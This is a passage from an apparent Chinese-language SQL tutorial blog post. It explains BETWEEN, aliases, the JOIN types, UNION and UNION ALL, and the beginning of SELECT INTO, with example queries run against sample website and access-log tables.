<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">BETWEEN</span> <span class="string">'A'</span> <span class="keyword">AND</span> <span class="string">'H'</span>;</span><br></pre></td></tr></table></figure>

<p>带有日期值的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 date 介于 ‘2016-05-10’ 和 ‘2016-05-14’ 之间的所有访问记录：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> access_log</span><br><span class="line"><span class="keyword">WHERE</span> <span class="built_in">date</span> <span class="keyword">BETWEEN</span> <span class="string">'2016-05-10'</span> <span class="keyword">AND</span> <span class="string">'2016-05-14'</span>;</span><br></pre></td></tr></table></figure>

<p>请注意，在不同的数据库中，BETWEEN 操作符会产生不同的结果！</p>
<p>在某些数据库中，BETWEEN 选取介于两个值之间但不包括两个测试值的字段。<br>在某些数据库中，BETWEEN 选取介于两个值之间且包括两个测试值的字段。<br>在某些数据库中，BETWEEN 选取介于两个值之间且包括第一个测试值但不包括最后一个测试值的字段。</p>
<p>因此，请检查您的数据库是如何处理 BETWEEN 操作符</p>
<h4 id="SQL-别名"><a href="#SQL-别名" class="headerlink" title="SQL 别名"></a>SQL 别名</h4><p>通过使用 SQL，可以为表名称或列名称指定别名。</p>
<p>基本上，创建别名是为了让列名称的可读性更强。</p>
<p>列的 SQL 别名语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">AS</span> alias_name</span><br><span class="line"><span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>表的 SQL 别名语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name <span class="keyword">AS</span> alias_name;</span><br></pre></td></tr></table></figure>

<p>列的别名实例</p>
<p>下面的 SQL 语句指定了两个别名，一个是 name 列的别名，一个是 country 列的别名。<strong>提示：</strong>如果列名称包含空格，要求使用双引号或方括号：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">AS</span> n, country <span class="keyword">AS</span> c</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>在下面的 SQL 语句中，我们把三个列（url、alexa 和 country）结合在一起，并创建一个名为 “site_info” 的别名：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, <span class="keyword">CONCAT</span>(<span class="keyword">url</span>, <span class="string">', '</span>, alexa, <span class="string">', '</span>, country) <span class="keyword">AS</span> site_info</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>表的别名实例</p>
<p>下面的 SQL 语句选取 “菜鸟教程” 的访问记录。我们使用 “Websites” 和 “access_log” 表，并分别为它们指定表别名 “w” 和 “a”（通过使用别名让 SQL 更简短）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> w.name, w.url, a.<span class="built_in">count</span>, a.date </span><br><span class="line"><span class="keyword">FROM</span> Websites <span class="keyword">AS</span> w, access_log <span class="keyword">AS</span> a </span><br><span class="line"><span class="keyword">WHERE</span> a.site_id=w.id <span class="keyword">and</span> w.name=<span class="string">"菜鸟教程"</span>;</span><br></pre></td></tr></table></figure>

<p>不带别名的相同的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SELECT</span> Websites.<span class="built_in">name</span>, Websites.url, access_log.<span class="built_in">count</span>, access_log.<span class="built_in">date</span> </span><br><span class="line"><span class="keyword">FROM</span> Websites, access_log </span><br><span class="line">WHERE Websites.id=access_log.site_id <span class="built_in">and</span> Websites.<span class="built_in">name</span>=<span class="string">"菜鸟教程"</span>;</span><br></pre></td></tr></table></figure>

<p>在下面的情况下，使用别名很有用：</p>
<ul>
<li>在查询中涉及超过一个表</li>
<li>在查询中使用了函数</li>
<li>列名称很长或者可读性差</li>
<li>需要把两个列或者多个列结合在一起</li>
</ul>
<h3 id="SQL-JOIN"><a href="#SQL-JOIN" class="headerlink" title="SQL JOIN"></a>SQL JOIN</h3><p>SQL join 用于把来自两个或多个表的行结合起来。</p>
<p>下图展示了 LEFT JOIN、RIGHT JOIN、INNER JOIN、OUTER JOIN 相关的 7 种用法。</p>
<p>![img](The First Day for Web/sql-join.png)</p>
<p>SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</p>
<p>SQL INNER JOIN</p>
<p>最常见的 JOIN 类型：<strong>SQL INNER JOIN（简单的 JOIN）</strong>。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。</p>
<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “access_log” 网站访问记录表的数据：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM access_log;</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line">| aid | site_id | count | date       |</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line">|   <span class="number">1</span> |       <span class="number">1</span> |    <span class="number">45</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-10</span> |</span><br><span class="line">|   <span class="number">2</span> |       <span class="number">3</span> |   <span class="number">100</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-13</span> |</span><br><span class="line">|   <span class="number">3</span> |       <span class="number">1</span> |   <span class="number">230</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">4</span> |       <span class="number">2</span> |    <span class="number">10</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">5</span> |       <span class="number">5</span> |   <span class="number">205</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">6</span> |       <span class="number">4</span> |    <span class="number">13</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-15</span> |</span><br><span class="line">|   <span class="number">7</span> |       <span class="number">3</span> |   <span class="number">220</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-15</span> |</span><br><span class="line">|   <span class="number">8</span> |       <span class="number">5</span> |   <span class="number">545</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-16</span> |</span><br><span class="line">|   <span class="number">9</span> |       <span class="number">3</span> |   <span class="number">201</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-17</span> |</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line"><span class="number">9</span> rows in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>请注意，”Websites” 表中的 “<strong>id</strong>“ 列指向 “access_log” 表中的字段 “<strong>site_id</strong>“。上面这两个表是通过 “site_id” 列联系起来的。</p>
<p>然后，如果我们运行下面的 SQL 语句（包含 INNER JOIN）：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.id, Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/join1.jpg)</p>
<p>不同的 SQL JOIN</p>
<p>在我们继续讲解实例之前，我们先列出您可以使用的不同的 SQL JOIN 类型：</p>
<ul>
<li><strong>INNER JOIN</strong>：如果表中有至少一个匹配，则返回行</li>
<li><strong>LEFT JOIN</strong>：即使右表中没有匹配，也从左表返回所有的行</li>
<li><strong>RIGHT JOIN</strong>：即使左表中没有匹配，也从右表返回所有的行</li>
<li><strong>FULL JOIN</strong>：只要其中一个表中存在匹配，则返回行</li>
</ul>
<p>首先，连接的结果可以在逻辑上看作是由SELECT语句指定的列组成的新表。</p>
<p>左连接与右连接的左右指的是以两张表中的哪一张为基准，它们都是外连接。</p>
<p>外连接就好像是为非基准表添加了一行全为空值的万能行，用来与基准表中找不到匹配的行进行匹配。假设两个没有空值的表进行左连接，左表是基准表，左表的所有行都出现在结果中，右表则可能因为无法与基准表匹配而出现是空值的字段。</p>
<p>这部分主要涉及的是表连接的逻辑问题，</p>
<p>得到的结果数：</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inner <span class="built_in">join</span> &lt;= <span class="built_in">min</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br><span class="line">full <span class="built_in">join</span> &gt;= <span class="built_in">max</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br><span class="line">当 inner <span class="built_in">join</span> &lt; <span class="built_in">min</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>) 时， full <span class="built_in">join</span> &gt; <span class="built_in">max</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INNER-JOIN-关键字"><a href="#SQL-INNER-JOIN-关键字" class="headerlink" title="SQL INNER JOIN 关键字"></a>SQL INNER JOIN 关键字</h4><p>INNER JOIN 关键字在表中存在至少一个匹配时返回行。</p>
<p>SQL INNER JOIN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>INNER JOIN 与 JOIN 是相同的。</p>
<p>![SQL INNER JOIN](The First Day for Web/img_innerjoin.gif)</p>
<p>SQL INNER JOIN 实例</p>
<p>下面的 SQL 语句将返回所有网站的访问记录：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>INNER JOIN 关键字在表中存在至少一个匹配时返回行。如果 “Websites” 表中的行在 “access_log” 中没有匹配，则不会列出这些行。</p>
<h4 id="SQL-LEFT-JOIN-关键字"><a href="#SQL-LEFT-JOIN-关键字" class="headerlink" title="SQL LEFT JOIN 关键字"></a>SQL LEFT JOIN 关键字</h4><p>LEFT JOIN 关键字从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</p>
<p>SQL LEFT JOIN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>在某些数据库中，LEFT JOIN 称为 LEFT OUTER JOIN。</p>
<p>![SQL LEFT JOIN](The First Day for Web/img_leftjoin.gif)</p>
<p>SQL LEFT JOIN 实例</p>
<p>下面的 SQL 语句将返回所有网站及他们的访问量（如果有的话）。</p>
<p>以下实例中我们把 Websites 作为左表，access_log 作为右表：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/left-join1.jpg)</p>
<p><strong>注释：</strong>LEFT JOIN 关键字从左表（Websites）返回所有的行，即使右表（access_log）中没有匹配。</p>
<p>在使用 <strong>join</strong> 时，<strong>on</strong> 和 <strong>where</strong> 条件的区别如下：</p>
<ul>
<li>1、 <strong>on</strong> 条件是在生成临时表时使用的条件，它不管 <strong>on</strong> 中的条件是否为真，都会返回左边表中的记录。</li>
<li>2、<strong>where</strong> 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 <strong>left join</strong> 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</li>
</ul>
<h4 id="SQL-RIGHT-JOIN-关键字"><a href="#SQL-RIGHT-JOIN-关键字" class="headerlink" title="SQL RIGHT JOIN 关键字"></a>SQL RIGHT JOIN 关键字</h4><p>几乎同 LEFT JOIN</p>
<h4 id="SQL-FULL-OUTER-JOIN-关键字"><a href="#SQL-FULL-OUTER-JOIN-关键字" class="headerlink" title="SQL FULL OUTER JOIN 关键字"></a>SQL FULL OUTER JOIN 关键字</h4><p>FULL OUTER JOIN 关键字只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行.</p>
<p>FULL OUTER JOIN 关键字结合了 LEFT JOIN 和 RIGHT JOIN 的结果。</p>
<p>SQL FULL OUTER JOIN 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>![SQL FULL OUTER JOIN](The First Day for Web/img_fulljoin.gif)</p>
<p>SQL FULL OUTER JOIN 实例</p>
<p>下面的 SQL 语句选取所有网站访问记录。</p>
<p><strong>MySQL中不支持 FULL OUTER JOIN，你可以在 SQL Server 测试以下实例。</strong></p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line">FULL <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>FULL OUTER JOIN 关键字返回左表（Websites）和右表（access_log）中所有的行。如果 “Websites” 表中的行在 “access_log” 中没有匹配或者 “access_log” 表中的行在 “Websites” 表中没有匹配，也会列出这些行。</p>
<h4 id="SQL-UNION-操作符"><a href="#SQL-UNION-操作符" class="headerlink" title="SQL UNION 操作符"></a>SQL UNION 操作符</h4><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
<p>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p>
<p>SQL UNION 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
<p>SQL UNION ALL 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>

<p><strong>注释：UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</strong></p>
<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT <span class="symbol">*</span> FROM Websites;</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “apps” APP 的数据：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM apps;</span><br><span class="line"><span class="code">+----+</span>------------<span class="code">+-------------------------+</span>---------+</span><br><span class="line">| id | app<span class="emphasis">_name   | url                     | country |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">|  1 | QQ APP     | http://im.qq.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  2 | 微博 APP | http://weibo.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<p>SQL UNION 实例</p>
<p>下面的 SQL 语句从 “Websites” 和 “apps” 表中选取所有<strong>不同的</strong>country（只有不同的值）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/union1.jpg)</p>
<p><strong>注释：</strong>UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！</p>
<hr>
<p>SQL UNION ALL 实例</p>
<p>下面的 SQL 语句使用 UNION ALL 从 “Websites” 和 “apps” 表中选取<strong>所有的</strong>country（也有重复的值）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/union2.jpg)</p>
<hr>
<p>带有 WHERE 的 SQL UNION ALL</p>
<p>下面的 SQL 语句使用 UNION ALL 从 “Websites” 和 “apps” 表中选取<strong>所有的</strong>中国(CN)的数据（也有重复的值）：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country, <span class="keyword">name</span> <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country, app_name <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/AAA99C7B-36A5-43FB-B489-F8CE63B62C71.jpg)</p>
<p>使用UNION命令时需要注意，只能在最后使用一个ORDER BY命令，是将两个查询结果合在一起之后，再进行排序！绝对不能写两个ORDER BY命令。</p>
<p>另外，在使用ORDER BY排序时，注意两个结果的别名保持一致，使用别名排序很方便。当然也可以使用列数。</p>
<p>ORDER BY 除了可以对指定的字段进行排序，还可以使用函数进行排序:</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="title">by</span> abs(a);</span><br></pre></td></tr></table></figure>

<h4 id="SQL-SELECT-INTO-语句"><a href="#SQL-SELECT-INTO-语句" class="headerlink" title="SQL SELECT INTO 语句"></a>SQL SELECT INTO 语句</h4><p>SELECT INTO 语句从一个表复制数据，然后把数据插入到另一个新表中。</p>
<p><strong>注意：</strong></p>
<p>MySQL 数据库不支持 SELECT … INTO 语句，但支持 INSERT INTO … SELECT 。</p>
<p>当然你可以使用以下语句来拷贝表结构及数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 新表</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 旧表</span><br></pre></td></tr></table></figure>

<p>SQL SELECT INTO 语法</p>
<p>我们可以复制所有的列插入到新表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line"><span class="keyword">INTO</span> newtable [<span class="keyword">IN</span> externaldb]</span><br><span class="line"><span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p>或者只复制希望的列插入到新表中：</p>
